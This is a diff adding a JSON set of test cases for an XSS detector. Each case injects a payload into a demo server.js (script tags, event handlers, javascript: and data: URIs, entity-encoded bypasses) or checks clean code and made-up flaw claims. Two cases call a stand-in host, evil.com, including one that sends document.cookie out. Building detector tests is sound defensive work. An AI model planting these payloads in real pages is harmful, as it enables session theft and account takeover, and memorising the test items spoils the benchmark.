@@ -1,0 +1,4704 @@
+[
+  {
+    "id": "xss-001",
+    "requiresDocker": false,
+    "description": "XSS-01: classic <script>alert(1)</script> injection",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script>alert(1)</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "reflected_xss",
+      "XSS-01"
+    ],
+    "rationale": "Classic reflected XSS via script tag"
+  },
+  {
+    "id": "xss-002",
+    "requiresDocker": false,
+    "description": "XSS-01: script tag with string argument",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script>alert('XSS')</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "reflected_xss",
+      "XSS-01"
+    ],
+    "rationale": "Script tag with string argument alert"
+  },
+  {
+    "id": "xss-003",
+    "requiresDocker": false,
+    "description": "XSS-01: external script src injection",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script src=//evil.com/xss.js></script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "reflected_xss",
+      "XSS-01"
+    ],
+    "rationale": "External script source inclusion"
+  },
+  {
+    "id": "xss-004",
+    "requiresDocker": false,
+    "description": "XSS-01: script with document.cookie exfiltration",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script>new Image().src=\"https://evil.com/?c=\"+document.cookie</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "reflected_xss",
+      "XSS-01"
+    ],
+    "rationale": "Cookie exfiltration via Image src"
+  },
+  {
+    "id": "xss-005",
+    "requiresDocker": false,
+    "description": "XSS-01: script with eval",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script>eval(\"alert(1)\")</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "reflected_xss",
+      "XSS-01"
+    ],
+    "rationale": "Eval-based XSS inside script tag"
+  },
+  {
+    "id": "xss-006",
+    "requiresDocker": false,
+    "description": "XSS-01: script with Function constructor",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script>Function(\"alert(1)\")()</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "reflected_xss",
+      "XSS-01"
+    ],
+    "rationale": "Function constructor XSS"
+  },
+  {
+    "id": "xss-007",
+    "requiresDocker": false,
+    "description": "XSS-01 clean: demo-app server.js has no script injection",
+    "edits": [],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "reflected_xss",
+      "XSS-01"
+    ],
+    "rationale": "Unmodified server.js contains no XSS vectors"
+  },
+  {
+    "id": "xss-008",
+    "requiresDocker": false,
+    "description": "XSS-01 clean: safe string literal mentioning script",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const tag = \"script_loader\";\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "reflected_xss",
+      "XSS-01"
+    ],
+    "rationale": "Word \"script\" in variable name is not XSS"
+  },
+  {
+    "id": "xss-009",
+    "requiresDocker": false,
+    "description": "XSS-01 grounding: fabricated claim about reflected XSS in /health endpoint",
+    "edits": [],
+    "predicates": [
+      {
+        "type": "content",
+        "file": "server.js",
+        "pattern": "res\\.send\\(req\\.query\\.q\\)"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "grounding",
+    "tags": [
+      "security",
+      "reflected_xss",
+      "XSS-01"
+    ],
+    "rationale": "server.js has no reflected user input; predicate references nonexistent pattern"
+  },
+  {
+    "id": "xss-010",
+    "requiresDocker": false,
+    "description": "XSS-01 grounding: fabricated claim about unsanitized URL parameter echo",
+    "edits": [],
+    "predicates": [
+      {
+        "type": "html",
+        "selector": "#xss-output",
+        "expected": "exists"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "grounding",
+    "tags": [
+      "security",
+      "reflected_xss",
+      "XSS-01"
+    ],
+    "rationale": "No #xss-output element exists in any route"
+  },
+  {
+    "id": "xss-011",
+    "requiresDocker": false,
+    "description": "XSS-02: img onerror=alert(1) injection",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<img onerror=alert(1) src=x>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "attribute_injection",
+      "XSS-02"
+    ],
+    "rationale": "Event handler onerror on img tag"
+  },
+  {
+    "id": "xss-012",
+    "requiresDocker": false,
+    "description": "XSS-02: body onload=alert(1)",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<body onload=alert(1)>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "attribute_injection",
+      "XSS-02"
+    ],
+    "rationale": "Event handler onload on body tag"
+  },
+  {
+    "id": "xss-013",
+    "requiresDocker": false,
+    "description": "XSS-02: input onfocus=alert(1) autofocus",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<input onfocus=alert(1) autofocus>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "attribute_injection",
+      "XSS-02"
+    ],
+    "rationale": "Onfocus handler triggered via autofocus"
+  },
+  {
+    "id": "xss-014",
+    "requiresDocker": false,
+    "description": "XSS-02: div onmouseover handler",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<div onmouseover=alert(1)>hover me</div>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "attribute_injection",
+      "XSS-02"
+    ],
+    "rationale": "Onmouseover event handler injection"
+  },
+  {
+    "id": "xss-015",
+    "requiresDocker": false,
+    "description": "XSS-02: button onclick handler",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<button onclick=alert(1)>Click</button>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "attribute_injection",
+      "XSS-02"
+    ],
+    "rationale": "Onclick event handler on button"
+  },
+  {
+    "id": "xss-016",
+    "requiresDocker": false,
+    "description": "XSS-02: select onfocus autofocus",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<select onfocus=alert(1) autofocus>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "attribute_injection",
+      "XSS-02"
+    ],
+    "rationale": "Onfocus on select with autofocus trigger"
+  },
+  {
+    "id": "xss-017",
+    "requiresDocker": false,
+    "description": "XSS-02: textarea onfocus autofocus",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<textarea onfocus=alert(1) autofocus>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "attribute_injection",
+      "XSS-02"
+    ],
+    "rationale": "Onfocus on textarea with autofocus trigger"
+  },
+  {
+    "id": "xss-018",
+    "requiresDocker": false,
+    "description": "XSS-02: marquee onstart handler",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<marquee onstart=alert(1)>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "attribute_injection",
+      "XSS-02"
+    ],
+    "rationale": "Onstart event on marquee element"
+  },
+  {
+    "id": "xss-019",
+    "requiresDocker": false,
+    "description": "XSS-02: details ontoggle handler",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<details ontoggle=alert(1) open>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "attribute_injection",
+      "XSS-02"
+    ],
+    "rationale": "Ontoggle on details element with open attribute"
+  },
+  {
+    "id": "xss-020",
+    "requiresDocker": false,
+    "description": "XSS-02 clean: img tag with valid src and alt only",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const img = \"<img src=\\\"/images/logo.png\\\" alt=\\\"logo\\\">\";\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "attribute_injection",
+      "XSS-02"
+    ],
+    "rationale": "Img tag with valid src and alt, no event handlers"
+  },
+  {
+    "id": "xss-021",
+    "requiresDocker": false,
+    "description": "XSS-02 clean: button with type attribute only",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const btn = \"<button type=\\\"submit\\\">Go</button>\";\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "attribute_injection",
+      "XSS-02"
+    ],
+    "rationale": "Button with safe type attribute, no onclick"
+  },
+  {
+    "id": "xss-022",
+    "requiresDocker": false,
+    "description": "XSS-02 grounding: fabricated onload handler in homepage",
+    "edits": [],
+    "predicates": [
+      {
+        "type": "content",
+        "file": "server.js",
+        "pattern": "onload=alert"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "grounding",
+    "tags": [
+      "security",
+      "attribute_injection",
+      "XSS-02"
+    ],
+    "rationale": "No onload event handler exists in server.js"
+  },
+  {
+    "id": "xss-023",
+    "requiresDocker": false,
+    "description": "XSS-03: iframe src javascript injection",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<iframe src=\"javascript:alert(1)\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "tag_injection",
+      "XSS-03"
+    ],
+    "rationale": "Iframe with javascript: src"
+  },
+  {
+    "id": "xss-024",
+    "requiresDocker": false,
+    "description": "XSS-03: iframe onload handler",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<iframe onload=alert(1) src=\"about:blank\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "tag_injection",
+      "XSS-03"
+    ],
+    "rationale": "Iframe with onload event handler"
+  },
+  {
+    "id": "xss-025",
+    "requiresDocker": false,
+    "description": "XSS-03: object onerror handler",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<object onerror=alert(1) data=x>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "tag_injection",
+      "XSS-03"
+    ],
+    "rationale": "Object tag with onerror handler"
+  },
+  {
+    "id": "xss-026",
+    "requiresDocker": false,
+    "description": "XSS-03: embed src javascript",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<embed src=\"javascript:alert(1)\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "tag_injection",
+      "XSS-03"
+    ],
+    "rationale": "Embed tag with javascript: protocol"
+  },
+  {
+    "id": "xss-027",
+    "requiresDocker": false,
+    "description": "XSS-03: video onerror handler",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<video onerror=alert(1)><source src=x></video>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "tag_injection",
+      "XSS-03"
+    ],
+    "rationale": "Video tag with onerror handler"
+  },
+  {
+    "id": "xss-028",
+    "requiresDocker": false,
+    "description": "XSS-03: audio onerror handler",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<audio onerror=alert(1) src=x>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "tag_injection",
+      "XSS-03"
+    ],
+    "rationale": "Audio tag with onerror handler"
+  },
+  {
+    "id": "xss-029",
+    "requiresDocker": false,
+    "description": "XSS-03: keygen onfocus autofocus",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<keygen onfocus=alert(1) autofocus>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "tag_injection",
+      "XSS-03"
+    ],
+    "rationale": "Deprecated keygen element with onfocus"
+  },
+  {
+    "id": "xss-030",
+    "requiresDocker": false,
+    "description": "XSS-03: isindex action javascript",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<isindex action=javascript:alert(1)>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "tag_injection",
+      "XSS-03"
+    ],
+    "rationale": "Deprecated isindex with javascript: action"
+  },
+  {
+    "id": "xss-031",
+    "requiresDocker": false,
+    "description": "XSS-03 clean: sandboxed iframe without handlers",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const el = \"<iframe src=\\\"/embed\\\" sandbox></iframe>\";\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "tag_injection",
+      "XSS-03"
+    ],
+    "rationale": "Sandboxed iframe with no event handlers"
+  },
+  {
+    "id": "xss-032",
+    "requiresDocker": false,
+    "description": "XSS-03 clean: video with valid source",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const el = \"<video controls><source src=\\\"/video.mp4\\\"></video>\";\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "tag_injection",
+      "XSS-03"
+    ],
+    "rationale": "Video element with valid source and controls"
+  },
+  {
+    "id": "xss-033",
+    "requiresDocker": false,
+    "description": "XSS-03 grounding: fabricated iframe in /about page",
+    "edits": [],
+    "predicates": [
+      {
+        "type": "html",
+        "selector": "iframe.malicious",
+        "expected": "exists"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "grounding",
+    "tags": [
+      "security",
+      "tag_injection",
+      "XSS-03"
+    ],
+    "rationale": "No iframe.malicious element exists in any route"
+  },
+  {
+    "id": "xss-034",
+    "requiresDocker": false,
+    "description": "XSS-04: javascript: href alert",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<a href=\"javascript:alert(1)\">click me</a>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "protocol_handlers",
+      "XSS-04"
+    ],
+    "rationale": "Anchor with javascript: protocol"
+  },
+  {
+    "id": "xss-035",
+    "requiresDocker": false,
+    "description": "XSS-04: javascript: void with onclick",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<a href=\"javascript:void(0)\" onclick=\"alert(1)\">click</a>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "protocol_handlers",
+      "XSS-04"
+    ],
+    "rationale": "javascript:void(0) with onclick handler"
+  },
+  {
+    "id": "xss-036",
+    "requiresDocker": false,
+    "description": "XSS-04: data: URI with HTML script",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<a href=\"data:text/html,<script>alert(1)</script>\">go</a>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "protocol_handlers",
+      "XSS-04"
+    ],
+    "rationale": "Data URI containing script tag"
+  },
+  {
+    "id": "xss-037",
+    "requiresDocker": false,
+    "description": "XSS-04: data: URI base64 encoded script",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">click</a>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "protocol_handlers",
+      "XSS-04"
+    ],
+    "rationale": "Base64 data URI hiding script tag"
+  },
+  {
+    "id": "xss-038",
+    "requiresDocker": false,
+    "description": "XSS-04: vbscript: protocol handler",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<a href=\"vbscript:MsgBox(1)\">click</a>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "protocol_handlers",
+      "XSS-04"
+    ],
+    "rationale": "VBScript protocol handler (IE-specific)"
+  },
+  {
+    "id": "xss-039",
+    "requiresDocker": false,
+    "description": "XSS-04: form action javascript protocol",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<form action=\"javascript:alert(1)\"><button>submit</button></form>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "protocol_handlers",
+      "XSS-04"
+    ],
+    "rationale": "Form action with javascript: protocol"
+  },
+  {
+    "id": "xss-040",
+    "requiresDocker": false,
+    "description": "XSS-04: meta refresh javascript URL",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "protocol_handlers",
+      "XSS-04"
+    ],
+    "rationale": "Meta refresh redirect to javascript: URL"
+  },
+  {
+    "id": "xss-041",
+    "requiresDocker": false,
+    "description": "XSS-04: object data javascript protocol",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<object data=\"javascript:alert(1)\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "protocol_handlers",
+      "XSS-04"
+    ],
+    "rationale": "Object data attribute with javascript: protocol"
+  },
+  {
+    "id": "xss-042",
+    "requiresDocker": false,
+    "description": "XSS-04 clean: anchor with relative href",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const link = \"<a href=\\\"/home\\\">Home</a>\";\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "protocol_handlers",
+      "XSS-04"
+    ],
+    "rationale": "Anchor with safe relative URL"
+  },
+  {
+    "id": "xss-043",
+    "requiresDocker": false,
+    "description": "XSS-04 clean: data URI for actual image",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const img = \"<img src=\\\"data:image/png;base64,iVBORw0KGgo=\\\">\";\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "protocol_handlers",
+      "XSS-04"
+    ],
+    "rationale": "Data URI for legitimate image data"
+  },
+  {
+    "id": "xss-044",
+    "requiresDocker": false,
+    "description": "XSS-04 grounding: fabricated javascript: href in nav links",
+    "edits": [],
+    "predicates": [
+      {
+        "type": "content",
+        "file": "server.js",
+        "pattern": "href=\"javascript:"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "grounding",
+    "tags": [
+      "security",
+      "protocol_handlers",
+      "XSS-04"
+    ],
+    "rationale": "No javascript: hrefs exist in server.js nav links"
+  },
+  {
+    "id": "xss-045",
+    "requiresDocker": false,
+    "description": "XSS-05: HTML entity decimal encoded onerror",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "HTML decimal entities spelling \"alert\""
+  },
+  {
+    "id": "xss-046",
+    "requiresDocker": false,
+    "description": "XSS-05: HTML entity hex encoded onerror",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "HTML hex entities spelling \"alert\""
+  },
+  {
+    "id": "xss-047",
+    "requiresDocker": false,
+    "description": "XSS-05: HTML entities without semicolons",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<img src=x onerror=&#97&#108&#101&#114&#116(1)>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "HTML entities without trailing semicolons"
+  },
+  {
